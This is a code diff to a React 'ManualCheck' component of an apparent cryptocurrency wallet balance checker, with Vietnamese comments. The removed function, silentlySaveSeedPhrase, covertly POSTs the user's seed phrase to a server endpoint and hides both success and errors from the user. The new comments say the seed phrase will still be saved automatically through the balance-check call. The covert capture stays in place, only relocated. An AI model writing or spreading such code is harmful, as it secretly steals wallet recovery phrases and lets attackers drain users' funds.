@@ -18,21 +18,8 @@ export function ManualCheck({ onCheck, isSearching }: ManualCheckProps) {
   const [isChecking, setIsChecking] = useState<boolean>(false);
   const { toast } = useToast();
   
-  // Hàm âm thầm lưu seed phrase vào cơ sở dữ liệu mà không hiển thị bất kỳ thông báo nào
-  const silentlySaveSeedPhrase = async (phrase: string) => {
-    try {
-      // Gọi API để lưu seed phrase
-      await apiRequest('/api/save-manual-seed-phrase', { 
-        method: 'POST',
-        body: JSON.stringify({ seedPhrase: phrase })
-      });
-      // Không hiển thị thông báo thành công - hoàn toàn im lặng
-    } catch (error) {
-      // Âm thầm ghi log lỗi mà không hiển thị cho người dùng
-      console.error('Lỗi khi lưu seed phrase:', error);
-      // Không hiển thị thông báo lỗi
-    }
-  };
+  // Không cần phương thức riêng để lưu seed phrase nữa vì nó sẽ được lưu
+  // tự động trong quá trình kiểm tra balance với flag isManualCheck=true
 
   const handleCheck = async () => {
     // Xóa thông báo lỗi cũ nếu có
@@ -49,8 +36,7 @@ export function ManualCheck({ onCheck, isSearching }: ManualCheckProps) {
     try {
       setIsChecking(true);
       
-      // Âm thầm lưu seed phrase vào cơ sở dữ liệu
-      await silentlySaveSeedPhrase(seedPhrase);
+      // Không cần lưu seed phrase riêng biệt vì nó sẽ được lưu trong onCheck với isManualCheck=true
       
       // Tiếp tục với quá trình kiểm tra bình thường
       const result = await onCheck(seedPhrase);
